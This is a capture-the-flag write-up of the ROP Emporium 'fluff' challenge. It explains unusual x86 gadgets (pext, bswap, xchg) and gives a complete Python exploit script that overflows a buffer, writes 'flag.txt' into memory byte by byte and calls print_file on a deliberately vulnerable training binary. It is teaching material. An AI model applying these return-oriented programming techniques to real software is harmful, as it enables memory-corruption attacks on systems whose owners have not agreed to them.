---
title: "ROP Emporium - fluff"
categories: [Binary, Exploitation]
tags: [x86, x86-64, ARMv5, ARM, MIPS]

---

In this challenge, we face a twist on the classic arbitrary-write scenario from the **write4** challenge. However, this time, we **don’t have easy-to-use `mov [addr], reg` gadgets**.

This time we will find a new function `questionableGadgets`. This must be added to give some hint. Let's disassemble it in **GDB**

```bash
pwndbg> disass questionableGadgets
Dump of assembler code for function questionableGadgets:
   0x08048543 <+0>:	mov    eax,ebp
   0x08048545 <+2>:	mov    ebx,0xb0bababa
   0x0804854a <+7>:	pext   edx,ebx,eax
   0x0804854f <+12>:	mov    eax,0xdeadbeef
   0x08048554 <+17>:	ret    
   0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
   0x08048557 <+20>:	ret    
   0x08048558 <+21>:	pop    ecx
   0x08048559 <+22>:	bswap  ecx
   0x0804855b <+24>:	ret    
   0x0804855c <+25>:	xchg   ax,ax
   0x0804855e <+27>:	xchg   ax,ax
End of assembler dump.

```

If you look carefully we see some _uncommon x86 instructions_ that may look scary at first:

- `pext`
- `bswap`
- `xchg`

But don’t worry — by the end of this post, these gadgets will feel much more familiar!

We already know the concept here is similar to the **write4** challenge, although we may struggle to find simple gadgets that will get the job done.


Our objective is to write the string `"flag.txt"` into memory and call `print_file("flag.txt")` to read the flag.


**`pext` Gadget:**

The **pext** (Parallel Bits Extract) instruction is an x86 assembly instruction is used to extract bits from a source operand according to a mask and pack them into contiguous low-order bits of the destination operand, with the higher-order bits zeroed.

**pext** takes three operands: a destination register, a source register, and a mask register or memory operand.

**Reference**

[felixcloutier](https://www.felixcloutier.com/x86/pext)

Suppose you have:

- **value**: `0b11010110` (binary for 214)
- **mask**: `0b10101010` (binary for 170)

**pext** will extract the bits from `value` at positions where `mask` has 1s, and pack them contiguously into the result's lower bits.

Let's break it down:

|Bit Position (7-0)|7|6|5|4|3|2|1|0|
|---|---|---|---|---|---|---|---|---|
|value|1|1|0|1|0|1|1|0|
|mask|1|0|1|0|1|0|1|0|

- Mask bits set (positions): 7, 5, 3, 1
- Extract those bits from value: 7→1, 5→0, 3→0, 1→1

Pack them into the result (from lowest to highest):
- Bit 0: value = 1
- Bit 1: value = 0
- Bit 2: value = 0
- Bit 3: value = 1

So, the result is `0b1001` (decimal 9).

Now, back to our gadget - `pext edx, ebx, eax` extracts bits from `ebx` using a mask in `eax` and saves the result into `edx`.
- We control `eax` via `pop ebp`.
- `ebx` is fixed to `0xb0bababa`.

This lets us **set a specific byte in `edx`** by crafting the correct bitmask (`eax`).


We can extract `'f'` (`0x66`, binary: `01100110`) from the constant `0xb0bababa` using the `pext` instruction

`ebx = 0xb0bababa` in Binary -

```txt
0xb0bababa = 1011 0000 1011 1010 1011 1010 1011 1010
```

```txt
'f' = 0x66 → 0110 0110
```

We must carefully craft a mask (`eax`) such that `pext` extracts bits from `ebx` to form `01100110` in `edx`.

Here’s a Python script that finds the correct mask by automating the process -

```python
def generate_mask(target_byte, source_val=0xb0bababa):
    target_bits = [1 if target_byte & (1 << (7 - n)) else 0 for n in range(8)]
    target_bits.reverse()  # LSB first (for pext)
    mask_bits = []
    ti = 0  # Index in target_bits
    for i in range(source_val.bit_length()):
        if ti >= len(target_bits):
            break
        bit = (source_val >> i) & 1
        if bit == target_bits[ti]:
            mask_bits.append(1)
            ti += 1
        else:
            mask_bits.append(0)
    mask_bits.reverse()
    mask = 0
    for bit in mask_bits:
        mask = (mask << 1) | bit
    return mask

mask = generate_mask(ord('f'))
print(f"Mask for 'f': {hex(mask)}")

```

On running the above script we get -

```bash
Mask for 'f': 0x4b4b
```

We can verify this -

```c
#include <immintrin.h>
#include <stdio.h>
#include <stdint.h>

int main() {
    uint64_t src = 0xb0bababa;
    uint64_t mask = 0x4b4b;
    uint64_t result = _pext_u64(src, mask);
    printf("Result: 0x%lx (char: '%c')\n", result, (char)result);
    return 0;
}

```

```bash
gcc -mbmi2 -o pext_demo pext_demo.c

./pext_demo
Result: 0x66 (char: 'f')
```

Now that we can load **any byte we want** into **`edx`**

**Next, we need to write this byte into memory.**  

```txt
xchg byte ptr [ecx], dl  ; Exchange byte in dl with memory at [ecx]
```

This allows us to **store the byte in `dl` (lower 8 bits of `edx`) into memory** at the address specified by `ecx`.

However, loading a memory address into `ecx` isn't as straightforward as in the previous challenge, since we don't have access to a simple `pop ecx; ret` gadget. Instead, we're provided with a `pop ecx; bswap ecx; ret;` sequence, which adds an extra layer of complexity.

```bash
ropper --file fluff32 --search 'pop'
#...
0x08048558: pop ecx; bswap ecx; ret;
#...
```

`bswap` Gadget:

The `bswap ecx` instruction **swaps the byte order** of the `ecx` register. In simple terms, it flips the bytes of the value inside `ecx`. So we need to provide the **target address** in **big-endian** format. The `bswap ecx` gadget will flip it back into the correct **little-endian** format that the program uses internally.

```bash
readelf -S fluff32 
#..
  [25] .bss       NOBITS          0804a020 001020 000004 00  WA  0   0  1
#...
```

Let’s say we want to write to address `0x0804a020`:

We simply encode the address in **big-endian** before using the gadget:

```python
struct.pack('>I', 0x0804a020)  # Big-endian encoding
```

Now, we have the required address loaded into `ecx`. Next, we can move on to the gadget that will **actually write the byte** to memory:


```bash
0x08048555: xchg byte ptr [ecx], dl; ret
```

This gadget might look unusual if you're new to such instructions, but it's actually quite straightforward. It exchanges the **lower byte of `edx`** (which is `dl`) with the **byte at memory address `[ecx]`**.

In short, the old value at `[ecx]` goes into `dl`, but we don't care about that here.

Now that we have every piece of the puzzle, we can now **chain them together** and fully craft our exploit.

```python
#!/usr/bin/python3
import struct
import sys

bss_addr = 0x0804a020  # .bss section
pop_ebp = 0x080485bb
gadget_pext = 0x08048543
gadget_xchg = 0x08048555
gadget_bswap = 0x08048558
print_file = 0x080483d0

def set_byte(byte):
    payload = b''
    eax = 0xb0bababa
    target_bits = [1 if byte & (1 << (7 - n)) else 0 for n in range(8)]
    target_bits.reverse()
    
    mask_bits = []
    ti = 0
    for i in range(eax.bit_length()):
        if ti >= len(target_bits):
            break
        tbit = target_bits[ti]
        bit = (eax >> i) & 1
        if bit == tbit:
            mask_bits.append(1)
            ti += 1
        else:
            mask_bits.append(0)

    mask_bits.reverse()
    mask = 0
    for bit in mask_bits:
        mask = (mask << 1) | bit

    payload += struct.pack("<I", pop_ebp) + struct.pack("<I", mask)
    payload += struct.pack("<I", gadget_pext)
    return payload

def set_address(addr):
    payload = struct.pack("<I", gadget_bswap) + struct.pack(">I", addr)
    return payload

def write_string(addr, s):
    payload = b''
    for i in range(len(s)):
        payload += set_byte(s[i])
        payload += set_address(addr + i)
        payload += struct.pack("<I", gadget_xchg)
    return payload

payload = b'A' * 44  # Buffer overflow padding
payload += write_string(bss_addr, b"flag.txt")
payload += struct.pack("<I", print_file) + struct.pack("<I", 0x0) + struct.pack("<I", bss_addr)

sys.stdout.buffer.write(payload)

```

And that’s it! Here’s what our ROP chain does step by step:

1. Load byte into `dl` (via `pext` gadget).
2. Set memory address in `ecx` (via `bswap` gadget with big-endian trick).
3. Write byte to memory (via `xchg` gadget).
4. Repeat for each character.
5. Call `print_file()` with address of our string.

Now that we’ve carefully crafted our ROP chain and put everything together, it’s time to run our exploit.

```bash
python exp.py  | ./fluff32 
fluff by ROP Emporium
x86

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)

```

Boom! We have solved the challenge!
The segmentation fault at the end is expected here—it simply means our program tried to continue running after finishing our exploit, but we didn’t bother cleaning up the stack properly.

